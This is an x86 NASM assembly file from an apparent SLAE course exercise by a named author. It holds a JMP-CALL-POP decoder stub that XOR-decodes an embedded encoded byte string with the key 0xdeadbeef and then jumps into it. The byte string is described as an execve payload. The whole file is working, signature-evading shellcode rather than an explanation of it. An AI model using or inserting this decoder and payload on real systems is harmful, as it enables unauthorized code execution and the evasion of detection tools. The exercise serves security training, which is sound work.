; Filename: 	dead_decoder.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This shellcode will decode an execve payload encoded using
;		custom schema, with byte flipping and XOR

global _start			

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	
	; As assumption, the first double word in our shellcode is the XOR key
	; we store in the ECX register.
	; When we will load another double word that it was equal to the key,
	; than we finished and we can do the jump into payload.
	mov ecx, dword [esi + eax]
	add al, 4
	
decode:
	mov ebx, dword [esi+eax]
	cmp ebx, ecx
	je short EncodedShellcode
	xor ebx, ecx
	;bswap ebx
	mov [edi], ebx
	add edi, 4
	add al, 4
	jmp short decode


call_shellcode:
	call decoder
	EncodedShellcode: db 0xef,0xbe,0xad,0xde,0xde,0x7e,0xfd,0xb6,0xc0,0x91,0xde,0xb6,0x87,0x91,0xcf,0xb7,0x81,0x37,0x4e,0xef,0x26,0x8f,0x7f,0x6e,0xe4,0x73,0x2d,0x4e,0xef,0xbe,0xad,0xde

